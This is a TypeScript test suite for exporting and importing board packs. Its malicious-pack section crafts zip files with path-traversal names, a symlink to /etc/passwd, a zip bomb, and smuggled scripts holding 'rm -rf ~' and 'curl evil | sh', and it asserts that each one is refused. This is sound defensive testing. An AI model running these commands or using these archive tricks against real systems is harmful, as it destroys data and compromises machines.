import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { test } from 'node:test'
import zlib from 'node:zlib'
import { type Block } from '../../packages/shared/src'
import { sha256Hex } from '../../packages/core/src/assets'
import { loadOrCreateToken } from '../../packages/core/src/auth'
import { BoardRegistry } from '../../packages/core/src/board'
import { exportPack, importPack, inspectPack, PACK_FORMAT } from '../../packages/core/src/pack'
import { SkillLibrary } from '../../packages/core/src/skills'
import { crc32 } from '../../packages/core/src/zip'
import { extractEntry, ZipError } from '../../packages/core/src/unzip'
import { listVersions } from '../../packages/core/src/versions'
import { sticky, tempHome } from './helpers'

const media = path.resolve(import.meta.dirname, '../fixtures/media')

function boardWithEverything(reg: BoardRegistry) {
  const b = reg.create('Launch plan')
  b.doc.transact(() => {
    const img = b.importAssetFile(path.join(media, 'whiteboard.png'), { mime: 'image/png', ext: 'png', role: 'image', name: 'whiteboard.png', w: 640, h: 400 })
    const vid = b.importAssetFile(path.join(media, 'teaser.mp4'), { mime: 'video/mp4', ext: 'mp4', role: 'video', name: 'teaser.mp4', w: 320, h: 180, duration: 4 })
    const html = b.putAsset(new TextEncoder().encode('<h1>Pricing</h1>'), { mime: 'text/html', ext: 'html', role: 'snippet-html', name: 'index.html' })
    b.blocks.set('s1', sticky('s1', 'Ship it'))
    b.blocks.set('img', { ...sticky('img'), kind: 'image', asset: img.id, text: '' } as Block)
    b.blocks.set('vid', { ...sticky('vid'), kind: 'video', asset: vid.id, poster: img.id, text: 'Teaser' } as Block)
    b.blocks.set('web', { ...sticky('web'), kind: 'web', text: 'Pricing', web: { mode: 'inline', src: { html: html.id }, title: 'Pricing', grants: ['network'] } } as Block)
    b.threads.set('t1', { id: 't1', target: 's1', author: { kind: 'human', id: 'h', name: 'Ana' }, text: 'Are we sure?', createdAt: 1, resolved: false, replies: [] })
    // an unused upload stays home
    b.putAsset(new TextEncoder().encode('never placed'), { mime: 'text/html', ext: 'html', role: 'snippet-html' })
  })
  b.saveNow(true)
  reg.safety.snapshot(b, 'checkpoint', 'First draft')
  return b
}

test('pack round trip: board, files, comments, history and skills survive; unused files and grants stay home', () => {
  const home = tempHome('pack')
  const token = loadOrCreateToken()
  const reg = new BoardRegistry()
  reg.loadAll()
  const skills = new SkillLibrary()
  const b = boardWithEverything(reg)
  const arch = skills.get('arch-kit')
  if (arch) b.doc.transact(() => b.skills.set('arch-kit', { ...arch, enabledAt: 1, enabledBy: 'You' }))
  const out = path.join(home, 'Launch plan.aifigpack')
  const r = exportPack(b, skills, out, { history: true, comments: true })
  assert.equal(r.manifest.format, PACK_FORMAT)
  assert.ok(r.manifest.files.some((f) => f.path === 'board.aifig'))
  assert.ok(r.manifest.files.some((f) => f.path.startsWith('history/')))
  const boardAssets = inspectPack(out).manifest.files.filter((f) => f.path.startsWith('assets/')).length
  assert.equal(boardAssets, 4, 'image, video, snippet html, and the unused upload only because the included version still names it')
  const noHistory = exportPack(b, skills, path.join(home, 'nh.aifigpack'), { history: false })
  assert.equal(noHistory.manifest.files.filter((f) => f.path.startsWith('assets/')).length, 3, 'without history the unused upload stays home')
  if (arch) assert.ok(r.manifest.includes.skills.includes('arch-kit') && r.manifest.files.some((f) => f.path === 'skills/arch-kit/SKILL.md'))
  const bytes = fs.readFileSync(out)
  assert.ok(!bytes.includes(Buffer.from(token)), 'the access token is never in a pack')
  assert.ok(!r.manifest.files.some((f) => /permissions|access-token|\.env/.test(f.path)))
  assert.equal(inspectPack(out).manifest.board.title, 'Launch plan')

  const versions = listVersions(b.id).length
  // someone else, another machine
  const other = tempHome('pack-in')
  const reg2 = new BoardRegistry()
  reg2.loadAll()
  const dest = path.join(other, 'Shared with me')
  const im = importPack(reg2, new SkillLibrary(), out, dest)
  assert.equal(path.basename(im.path), 'Launch plan.aifig')
  assert.ok(fs.existsSync(path.join(dest, 'Launch plan.assets')))
  const nb = im.board
  assert.equal(nb.blocks.size, 4)
  assert.equal(nb.threads.size, 1)
  assert.equal(nb.blocks.get('web')!.web!.grants?.length ?? 0, 0, 'snippet grants are not shared')
  assert.equal(nb.snippetSource(nb.blocks.get('web')!.web).html, '<h1>Pricing</h1>')
  const vid = nb.assets.get(nb.blocks.get('vid')!.asset!)!
  assert.equal(sha256Hex(nb.readAsset(vid)!), sha256Hex(fs.readFileSync(path.join(media, 'teaser.mp4'))))
  assert.equal(im.history, versions)
  assert.equal(listVersions(nb.id).find((v) => v.kind === 'checkpoint')?.name, 'First draft')
  if (arch) assert.ok(im.skills.skipped.some((s) => s.name === 'arch-kit' && /built in/.test(s.reason)), 'built-in skills are never overwritten')

  // importing again never replaces the first one
  const again = importPack(reg2, new SkillLibrary(), out, dest)
  assert.equal(path.basename(again.path), 'Launch plan 2.aifig')
})

test('without comments, neither the board nor its history carries them', () => {
  const home = tempHome('pack-nc')
  const reg = new BoardRegistry()
  reg.loadAll()
  const b = boardWithEverything(reg)
  const out = path.join(home, 'x.aifigpack')
  exportPack(b, new SkillLibrary(), out, { history: true, comments: false })
  const reg2 = new BoardRegistry()
  const im = importPack(reg2, new SkillLibrary(), out, path.join(home, 'in'))
  assert.equal(im.board.threads.size, 0)
  assert.equal(im.manifest.includes.comments, false)
  const zipBytes = fs.readFileSync(out)
  assert.ok(!zipBytes.includes(Buffer.from('Are we sure?')), 'the comment text is nowhere in the pack (history included)')
})

test('a board holding the access token is refused', () => {
  const home = tempHome('pack-tok')
  const token = loadOrCreateToken()
  const reg = new BoardRegistry()
  reg.loadAll()
  const b = reg.create('Oops')
  b.doc.transact(() => b.blocks.set('s', sticky('s', `my token is ${token}`)))
  assert.throws(() => exportPack(b, new SkillLibrary(), path.join(home, 'o.aifigpack')), /access token/)
  assert.ok(!fs.existsSync(path.join(home, 'o.aifigpack')))
})

// ---- malicious packs ------------------------------------------------------------------------------

interface Raw {
  name: string
  data?: Buffer
  deflate?: boolean
  /** lie about the uncompressed size */
  declared?: number
  symlink?: boolean
  encrypted?: boolean
}

/** A zip written by hand, so it can be as wrong as an attacker likes. */
function craft(entries: Raw[]) {
  const locals: Buffer[] = []
  const centrals: Buffer[] = []
  let offset = 0
  for (const e of entries) {
    const name = Buffer.from(e.name, 'utf8')
    const raw = e.data ?? Buffer.alloc(0)
    const packed = e.deflate ? zlib.deflateRawSync(raw) : raw
    const size = e.declared ?? raw.length
    const flags = 0x0800 | (e.encrypted ? 1 : 0)
    const l = Buffer.alloc(30)
    l.writeUInt32LE(0x04034b50, 0)
    l.writeUInt16LE(20, 4)
    l.writeUInt16LE(flags, 6)
    l.writeUInt16LE(e.deflate ? 8 : 0, 8)
    l.writeUInt32LE(crc32(raw), 14)
    l.writeUInt32LE(packed.length, 18)
    l.writeUInt32LE(size, 22)
    l.writeUInt16LE(name.length, 26)
    locals.push(l, name, packed)
    const c = Buffer.alloc(46)
    c.writeUInt32LE(0x02014b50, 0)
    c.writeUInt16LE(0x0314, 4)
    c.writeUInt16LE(20, 6)
    c.writeUInt16LE(flags, 8)
    c.writeUInt16LE(e.deflate ? 8 : 0, 10)
    c.writeUInt32LE(crc32(raw), 16)
    c.writeUInt32LE(packed.length, 20)
    c.writeUInt32LE(size, 24)
    c.writeUInt16LE(name.length, 28)
    c.writeUInt32LE(((e.symlink ? 0o120777 : 0o100644) << 16) >>> 0, 38)
    c.writeUInt32LE(offset, 42)
    centrals.push(c, name)
    offset += 30 + name.length + packed.length
  }
  const cd = Buffer.concat(centrals)
  const end = Buffer.alloc(22)
  end.writeUInt32LE(0x06054b50, 0)
  end.writeUInt16LE(entries.length, 8)
  end.writeUInt16LE(entries.length, 10)
  end.writeUInt32LE(cd.length, 12)
  end.writeUInt32LE(offset, 16)
  return Buffer.concat([...locals, cd, end])
}

/** A real, valid pack's entries, to tamper with. */
function validEntries(home: string): Raw[] {
  const reg = new BoardRegistry()
  reg.loadAll()
  const b = reg.create('Target')
  b.doc.transact(() => {
    const a = b.importAssetFile(path.join(media, 'whiteboard.png'), { mime: 'image/png', ext: 'png', role: 'image' })
    b.blocks.set('i', { ...sticky('i'), kind: 'image', asset: a.id } as Block)
  })
  const out = path.join(home, 'valid.aifigpack')
  exportPack(b, new SkillLibrary(), out)
  const fd = fs.openSync(out, 'r')
  try {
    return inspectPack(out).items.map((it) => ({ name: it.name, data: extractEntry(fd, it).data! }))
  } finally {
    fs.closeSync(fd)
  }
}

function manifestFor(entries: Raw[], extra: Record<string, unknown> = {}) {
  return Buffer.from(
    JSON.stringify({
      format: 'aifigpack',
      version: 1,
      createdAt: '',
      app: 'x',
      board: { title: 'Target', schema: '2.0', blocks: 1, file: 'board.aifig' },
      includes: { history: false, comments: true, skills: [] },
      files: entries.filter((e) => e.name !== 'manifest.json').map((e) => ({ path: e.name, size: e.declared ?? e.data!.length, sha256: sha256Hex(e.data!) })),
      ...extra,
    }),
  )
}

test('malicious and broken packs are refused before anything reaches the destination', () => {
  const home = tempHome('pack-bad')
  const good = validEntries(home).filter((e) => e.name !== 'manifest.json')
  const cases: [string, Buffer, RegExp][] = []
  const withManifest = (entries: Raw[], extra?: Record<string, unknown>) => craft([{ name: 'manifest.json', data: manifestFor(entries, extra) }, ...entries])
  for (const bad of ['../escape.txt', '../../../../tmp/escape.txt', '/etc/passwd', 'C:/Windows/evil.dll', 'assets\\..\\..\\evil', 'skills/x/../../evil.md', 'assets/./x.png']) {
    cases.push([`zip-slip: ${bad}`, withManifest([...good, { name: bad, data: Buffer.from('pwned') }]), /Unsafe path/])
  }
  cases.push(['a symlink', withManifest([...good, { name: 'skills/x/SKILL.md', data: Buffer.from('/etc/passwd'), symlink: true }]), /symbolic link/])
  cases.push(['an encrypted entry', withManifest([...good.map((e, i) => (i === 0 ? { ...e, encrypted: true } : e))]), /encrypted/])
  cases.push(['a file not in the manifest', craft([{ name: 'manifest.json', data: manifestFor(good) }, ...good, { name: 'assets/extra.png', data: Buffer.from('x') }]), /not in its manifest|doesn’t belong/])
  cases.push(['an executable smuggled in', withManifest([...good, { name: 'run.sh', data: Buffer.from('rm -rf ~') }]), /doesn’t belong/])
  cases.push(['a skill script', withManifest([...good, { name: 'skills/evil/install.sh', data: Buffer.from('curl evil | sh') }]), /doesn’t belong/])
  const tampered = good.map((e) => (e.name.startsWith('assets/') ? { ...e, data: Buffer.concat([e.data!, Buffer.from('!')]) } : e))
  cases.push(['a file changed after packing (checksum)', craft([{ name: 'manifest.json', data: manifestFor(good) }, ...tampered]), /size in the manifest|checksum/])
  const renamed = good.map((e) => (e.name.startsWith('assets/') ? { ...e, name: `assets/${'0'.repeat(64)}.png` } : e))
  cases.push(['an asset whose bytes don’t match its name', withManifest(renamed), /match its name/])
  cases.push(['a zip bomb (expands 1000×)', withManifest([...good, { name: 'assets/' + 'a'.repeat(64) + '.png', data: Buffer.alloc(60 * 1024 * 1024), deflate: true }]), /expands suspiciously|too large/])
  const liar: Raw = { name: 'history/vliar1.aifig', data: Buffer.alloc(8 * 1024 * 1024, 7), deflate: true, declared: 1000 }
  cases.push(['an entry larger than it declares', withManifest([...good, liar]), /size it claims|decompressed/])
  cases.push(['a duplicate entry', craft([{ name: 'manifest.json', data: manifestFor(good) }, ...good, good[0]]), /twice/])
  cases.push(['a pack from a newer ai-figma', withManifest(good, { version: 9 }), /newer ai-figma/])
  cases.push(['not a pack at all', craft([{ name: 'hello.txt', data: Buffer.from('hi') }]), /no manifest/])
  cases.push(['a truncated file', withManifest(good).subarray(0, 200), /Not a zip|truncated|damaged/])
  const corruptBoard = good.map((e) => (e.name === 'board.aifig' ? { ...e, data: Buffer.concat([e.data!.subarray(0, e.data!.length - 20), Buffer.alloc(20, 1)]) } : e))
  cases.push(['a damaged board inside a consistent pack', withManifest(corruptBoard), /checksum|damaged/])
  cases.push(['too many entries', withManifest([...good, ...Array.from({ length: 20_001 }, (_, i) => ({ name: `skills/s/f${i}.md`, data: Buffer.from('x') }))]), /Too many files/])

  for (const [label, zip, why] of cases) {
    const file = path.join(home, `case-${Math.random().toString(36).slice(2)}.aifigpack`)
    fs.writeFileSync(file, zip)
    const dest = path.join(home, 'dest', label.replace(/\W+/g, '-'))
    const reg = new BoardRegistry()
    reg.loadAll()
    const before = reg.all().length
    assert.throws(() => importPack(reg, new SkillLibrary(), file, dest), (e: unknown) => (e instanceof ZipError || e instanceof Error) && why.test((e as Error).message), `${label}: expected ${why}`)
    assert.deepEqual(fs.existsSync(dest) ? fs.readdirSync(dest) : [], [], `${label}: nothing left in the destination`)
    assert.ok(!fs.existsSync(path.join(home, 'escape.txt')) && !fs.existsSync(path.join(home, 'dest', 'escape.txt')), `${label}: nothing escaped`)
    assert.equal(reg.all().length, before, `${label}: no board was opened`)
  }
})
